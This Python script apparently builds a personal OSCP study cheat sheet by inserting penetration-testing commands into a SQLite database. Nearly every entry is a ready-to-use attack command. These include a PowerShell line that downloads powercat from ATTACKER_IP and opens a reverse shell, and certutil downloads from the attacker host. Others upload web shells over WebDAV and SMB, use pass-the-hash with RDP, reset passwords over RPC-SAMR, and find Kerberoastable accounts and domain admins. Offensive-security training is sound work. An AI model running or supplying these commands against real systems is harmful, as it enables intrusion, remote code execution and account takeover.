#!/usr/bin/env python3
"""
##############################################
## Freeworld - Allergic to aluminum baby   ##
## OSCP Command DB - TOOLS MEGA PATCH      ##
##############################################
Adds:
  - powercat reverse shell
  - xfreerdp
  - WebDAV commands
  - smbclient commands
  - rpcclient commands
  - certutil download
  - PowerShell AD/LDAP enumeration
Usage:
    python3 tools_patch.py
Skips duplicates by exact command match - safe to re-run.
"""
import sqlite3
import os

DB_PATH = os.path.expanduser("~/.oscp_commands.db")

commands = [
    # ─── POWERCAT ───────────────────────────────────────────────
    {
        "tool": "powercat",
        "description": "Download and execute powercat reverse shell via IEX -- calls back on specified port",
        "command": "powershell.exe -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://ATTACKER_IP:8000/powercat.ps1'); powercat -c ATTACKER_IP -p 4444 -e powershell\"",
        "category": "shells",
        "tags": "windows,powershell,reverse-shell,powercat,iex"
    },
    {
        "tool": "powercat",
        "description": "Serve powercat.ps1 from Kali tools directory",
        "command": "cd ~/oscp/tools && python3 -m http.server 8000",
        "category": "shells",
        "tags": "windows,powershell,reverse-shell,powercat,serve"
    },
    # ─── XFREERDP ───────────────────────────────────────────────
    {
        "tool": "xfreerdp",
        "description": "Connect to RDP with domain credentials",
        "command": "xfreerdp /u:USERNAME /d:DOMAIN /p:'PASSWORD' /v:TARGET_IP",
        "category": "lateral-movement",
        "tags": "windows,rdp,xfreerdp,lateral-movement,remote-desktop"
    },
    {
        "tool": "xfreerdp",
        "description": "Connect to RDP with drive share and fullscreen",
        "command": "xfreerdp /u:USERNAME /d:DOMAIN /p:'PASSWORD' /v:TARGET_IP /drive:share,/tmp /dynamic-resolution +clipboard",
        "category": "lateral-movement",
        "tags": "windows,rdp,xfreerdp,lateral-movement,file-transfer"
    },
    {
        "tool": "xfreerdp",
        "description": "Connect to RDP with hash (pass the hash)",
        "command": "xfreerdp /u:USERNAME /d:DOMAIN /pth:NTHASH /v:TARGET_IP",
        "category": "lateral-movement",
        "tags": "windows,rdp,xfreerdp,pass-the-hash,lateral-movement"
    },
    # ─── WEBDAV ─────────────────────────────────────────────────
    {
        "tool": "davtest",
        "description": "Test WebDAV server for enabled file types and upload capability",
        "command": "davtest -url http://TARGET_IP",
        "category": "web",
        "tags": "windows,webdav,enumeration,iis,upload"
    },
    {
        "tool": "davtest",
        "description": "Test WebDAV with authentication",
        "command": "davtest -url http://TARGET_IP -auth USER:PASS",
        "category": "web",
        "tags": "windows,webdav,enumeration,iis,upload,auth"
    },
    {
        "tool": "cadaver",
        "description": "Interactive WebDAV client -- connect and upload files",
        "command": "cadaver http://TARGET_IP",
        "category": "web",
        "tags": "windows,webdav,upload,cadaver,iis,interactive"
    },
    {
        "tool": "cadaver",
        "description": "WebDAV cadaver commands reference -- put/get/delete/ls",
        "command": "put shell.aspx && get file.txt && delete shell.aspx && ls",
        "category": "web",
        "tags": "windows,webdav,upload,cadaver,iis,aspx"
    },
    {
        "tool": "curl",
        "description": "Upload file to WebDAV with curl and credentials",
        "command": "curl -u 'USER:PASS' -T shell.aspx http://TARGET_IP/shell.aspx",
        "category": "web",
        "tags": "windows,webdav,upload,curl,iis,aspx"
    },
    {
        "tool": "curl",
        "description": "Submit WebDAV upload form with all required fields",
        "command": "curl -X POST http://TARGET/upload.php -H 'Referer: http://TARGET/' -F 'the_file=@shell.aspx' -F 'submit=Upload'",
        "category": "web",
        "tags": "windows,webdav,upload,curl,form,iis"
    },
    # ─── SMBCLIENT ──────────────────────────────────────────────
    {
        "tool": "smbclient",
        "description": "List SMB shares anonymously",
        "command": "smbclient -L //TARGET_IP -N",
        "category": "enumeration",
        "tags": "windows,smb,enumeration,anonymous,shares"
    },
    {
        "tool": "smbclient",
        "description": "List SMB shares with credentials",
        "command": "smbclient -L //TARGET_IP -U 'DOMAIN\\USER%PASSWORD'",
        "category": "enumeration",
        "tags": "windows,smb,enumeration,shares,credentials"
    },
    {
        "tool": "smbclient",
        "description": "Connect to SMB share interactively",
        "command": "smbclient //TARGET_IP/SHARE -U 'DOMAIN\\USER%PASSWORD'",
        "category": "enumeration",
        "tags": "windows,smb,shares,interactive,credentials"
    },
    {
        "tool": "smbclient",
        "description": "Download all files from SMB share recursively",
        "command": "smbclient //TARGET_IP/SHARE -U 'USER%PASS' -c 'recurse ON; prompt OFF; mget *'",
        "category": "enumeration",
        "tags": "windows,smb,download,recursive,shares"
    },
    {
        "tool": "smbclient",
        "description": "Upload file to SMB share",
        "command": "smbclient //TARGET_IP/SHARE -U 'USER%PASS' -c 'put shell.exe'",
        "category": "lateral-movement",
        "tags": "windows,smb,upload,shares,lateral-movement"
    },
    # ─── RPCCLIENT ──────────────────────────────────────────────
    {
        "tool": "rpcclient",
        "description": "Connect to RPC with null session",
        "command": "rpcclient -U '' -N TARGET_IP",
        "category": "enumeration",
        "tags": "windows,rpc,enumeration,null-session,anonymous"
    },
    {
        "tool": "rpcclient",
        "description": "Enumerate domain users via RPC",
        "command": "rpcclient -U 'USER%PASS' TARGET_IP -c 'enumdomusers'",
        "category": "enumeration",
        "tags": "windows,rpc,enumeration,users,ad"
    },
    {
        "tool": "rpcclient",
        "description": "Enumerate domain groups via RPC",
        "command": "rpcclient -U 'USER%PASS' TARGET_IP -c 'enumdomgroups'",
        "category": "enumeration",
        "tags": "windows,rpc,enumeration,groups,ad"
    },
    {
        "tool": "rpcclient",
        "description": "Get user info via RPC -- SID, description, last logon",
        "command": "rpcclient -U 'USER%PASS' TARGET_IP -c 'queryuser USERNAME'",
        "category": "enumeration",
        "tags": "windows,rpc,enumeration,users,ad"
    },
    {
        "tool": "rpcclient",
        "description": "Enumerate password policy via RPC",
        "command": "rpcclient -U 'USER%PASS' TARGET_IP -c 'getdompwinfo'",
        "category": "enumeration",
        "tags": "windows,rpc,enumeration,password-policy,ad"
    },
    {
        "tool": "rpcclient",
        "description": "Change user password via RPC-SAMR",
        "command": "rpcclient -U 'USER%PASS' TARGET_IP -c \"setuserinfo2 TARGET_USER 23 'NEWPASS'\"",
        "category": "ad-attacks",
        "tags": "windows,rpc,password-change,samr,ad"
    },
    # ─── CERTUTIL ───────────────────────────────────────────────
    {
        "tool": "certutil",
        "description": "Download file from attacker using certutil -- works when PowerShell is blocked",
        "command": "certutil -urlcache -split -f http://ATTACKER_IP/file.exe C:\\Windows\\Temp\\file.exe",
        "category": "transfer",
        "tags": "windows,download,certutil,lolbas,file-transfer"
    },
    {
        "tool": "certutil",
        "description": "Encode file to base64 with certutil for exfil",
        "command": "certutil -encode C:\\path\\to\\file.txt C:\\path\\to\\file.b64",
        "category": "transfer",
        "tags": "windows,certutil,base64,encode,exfil,lolbas"
    },
    {
        "tool": "certutil",
        "description": "Decode base64 file with certutil",
        "command": "certutil -decode C:\\path\\to\\file.b64 C:\\path\\to\\file.exe",
        "category": "transfer",
        "tags": "windows,certutil,base64,decode,lolbas"
    },
    {
        "tool": "certutil",
        "description": "Compute MD5 hash of file with certutil",
        "command": "certutil -hashfile C:\\path\\to\\file.exe MD5",
        "category": "transfer",
        "tags": "windows,certutil,hash,md5,lolbas"
    },
    # ─── POWERSHELL AD LDAP ENUMERATION ─────────────────────────
    {
        "tool": "powershell-ad",
        "description": "Get current AD domain object via .NET -- shows domain name, PDC, DCs",
        "command": "$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain(); $domainObj",
        "category": "enumeration",
        "tags": "windows,powershell,ad,ldap,enumeration,domain"
    },
    {
        "tool": "powershell-ad",
        "description": "LDAP search function -- reusable wrapper for AD queries without RSAT",
        "command": "function LDAPSearch { param([string]$LDAPQuery); $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name; $DN = ([adsi]'').distinguishedName; $DE = New-Object System.DirectoryServices.DirectoryEntry(\"LDAP://$PDC/$DN\"); $DS = New-Object System.DirectoryServices.DirectorySearcher($DE, $LDAPQuery); return $DS.FindAll() }",
        "category": "enumeration",
        "tags": "windows,powershell,ad,ldap,enumeration,function"
    },
    {
        "tool": "powershell-ad",
        "description": "LDAP search for specific user -- shows group memberships and properties",
        "command": "$PDC = ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).PdcRoleOwner.Name; $DN = ([adsi]'').distinguishedName; $direntry = New-Object System.DirectoryServices.DirectoryEntry(\"LDAP://$PDC/$DN\"); $dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry); $dirsearcher.filter='(name=TARGET_USER)'; $dirsearcher.FindAll() | %{ $_.Properties | %{ $_.memberof } }",
        "category": "enumeration",
        "tags": "windows,powershell,ad,ldap,enumeration,users,groups"
    },
    {
        "tool": "powershell-ad",
        "description": "LDAP search for all users with SPN set -- Kerberoastable accounts",
        "command": "LDAPSearch -LDAPQuery '(&(samAccountType=805306368)(servicePrincipalName=*))'",
        "category": "enumeration",
        "tags": "windows,powershell,ad,ldap,kerberoast,spn,enumeration"
    },
    {
        "tool": "powershell-ad",
        "description": "LDAP search for all domain admins group members",
        "command": "LDAPSearch -LDAPQuery '(memberOf=CN=Domain Admins,CN=Users,DC=DOMAIN,DC=COM)'",
        "category": "enumeration",
        "tags": "windows,powershell,ad,ldap,enumeration,domain-admins,groups"
    },
]

def run():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    added = 0
    skipped = 0
    for entry in commands:
        c.execute("SELECT id FROM commands WHERE command = ?", (entry["command"],))
        if c.fetchone():
            print(f"  [~] Skipped (exists): {entry['tool']} -- {entry['description'][:55]}")
            skipped += 1
        else:
            c.execute(
                "INSERT INTO commands (tool, description, command, category, tags) VALUES (?,?,?,?,?)",
                (entry["tool"], entry["description"], entry["command"], entry["category"], entry["tags"])
            )
            print(f"  [+] Added: {entry['tool']} -- {entry['description'][:55]}")
            added += 1
    conn.commit()
    conn.close()
    print(f"\n  Done. {added} added, {skipped} skipped.\n")

if __name__ == "__main__":
    run()
